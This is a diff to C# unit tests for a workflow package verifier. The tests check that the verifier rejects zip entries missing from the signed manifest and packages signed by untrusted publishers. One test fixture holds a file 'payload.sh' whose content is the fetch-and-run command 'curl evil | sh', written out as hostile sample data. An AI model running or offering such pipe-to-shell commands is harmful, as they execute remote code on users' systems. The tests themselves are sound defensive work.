@@ -14,6 +14,8 @@ public class WorkflowPackageVerifierTests
 {
     private RSA _rsa = null!;
     private MemoryStream _validZipStream = null!;
+    private byte[] _manifestBytes = null!;
+    private byte[] _schemaContent = null!;
 
     [SetUp]
     public void SetUp()
@@ -41,6 +43,8 @@ public class WorkflowPackageVerifierTests
         var signedManifest = unsignedManifest with { SignatureBase64 = Convert.ToBase64String(signature) };
         var manifestBytes = JsonSerializer.SerializeToUtf8Bytes(signedManifest, WorkflowPackageJsonOptions.SerializeOptions);
 
+        _manifestBytes = manifestBytes;
+        _schemaContent = schemaContent;
         _validZipStream = BuildZip([("workflow-schema.json", schemaContent), ("package-manifest.json", manifestBytes)]);
     }
 
@@ -72,6 +76,40 @@ public class WorkflowPackageVerifierTests
         }
         ms.Position = 0;
         return ms;
+    }
+
+    [Test]
+    public void Verify_AnEntryTheSignedManifestDoesNotList_IsRejected()
+    {
+        using var zip = BuildZip([
+            ("workflow-schema.json", _schemaContent), ("package-manifest.json", _manifestBytes),
+            ("payload.sh", Encoding.UTF8.GetBytes("curl evil | sh"))]);
+
+        Assert.That(CreateVerifier(devModeActive: false).Verify(zip), Is.False,
+            "an unlisted file would be extracted beside the signed ones");
+    }
+
+    [Test]
+    public void Verify_WithTrustedKeys_RejectsAValidSignatureByAnUntrustedPublisher()
+    {
+        using var other = RSA.Create(2048);
+        var verifier = new WorkflowPackageVerifier(
+            Mock.Of<IDeveloperModeProvider>(), Mock.Of<ILogger<WorkflowPackageVerifier>>(),
+            [Convert.ToBase64String(other.ExportSubjectPublicKeyInfo())]);
+        _validZipStream.Position = 0;
+
+        Assert.That(verifier.Verify(_validZipStream), Is.False);
+    }
+
+    [Test]
+    public void Verify_WithTrustedKeys_AcceptsTheTrustedPublisher()
+    {
+        var verifier = new WorkflowPackageVerifier(
+            Mock.Of<IDeveloperModeProvider>(), Mock.Of<ILogger<WorkflowPackageVerifier>>(),
+            [Convert.ToBase64String(_rsa.ExportSubjectPublicKeyInfo())]);
+        _validZipStream.Position = 0;
+
+        Assert.That(verifier.Verify(_validZipStream), Is.True);
     }
 
     [Test]
